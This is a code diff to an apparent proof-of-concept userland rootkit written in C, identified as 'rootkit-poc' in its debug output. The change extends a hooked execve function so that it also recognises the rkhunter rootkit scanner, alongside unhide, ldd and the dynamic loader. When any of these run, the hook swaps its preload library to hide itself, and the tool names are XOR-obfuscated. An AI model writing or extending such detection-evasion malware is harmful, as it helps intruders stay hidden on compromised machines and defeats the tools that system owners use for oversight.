@@ -265,6 +265,7 @@ FILE *hide_ports(const char *filename) {
 int execve(const char *path, char *const argv[], char *const envp[]) {
     DEBUG("[rootkit-poc]: execve hooked %s\n", path);
 
+    char *rkhunter = strdup(C_RKHUNTER);
     char *unhide = strdup(C_UNHIDE);
     char *ldd = strdup(C_LDD);
     char *ld_linux = strdup(LD_LINUX);
@@ -280,12 +281,13 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
 
     init(); // hook configurations
 
+    xor(rkhunter);
     xor(unhide);
     xor(ldd);
     xor(ld_linux);
 
     // If the path corresponds to certain debugging or analysis tools
-    if (strstr(path, unhide) || strstr(path, ldd) || strstr(path, ld_linux) || trace_var != NULL) {
+    if (strstr(path, rkhunter) || strstr(path, unhide) || strstr(path, ldd) || strstr(path, ld_linux) || trace_var != NULL) {
         char *ld_normal = strdup(LD_NORMAL);
         char *ld_hide = strdup(LD_HIDE);
 
@@ -319,6 +321,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         ret = (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
     }
 
+    cleanup(rkhunter, strlen(rkhunter));
     cleanup(unhide, strlen(unhide));
     cleanup(ldd, strlen(ldd));
     cleanup(ld_linux, strlen(ld_linux));
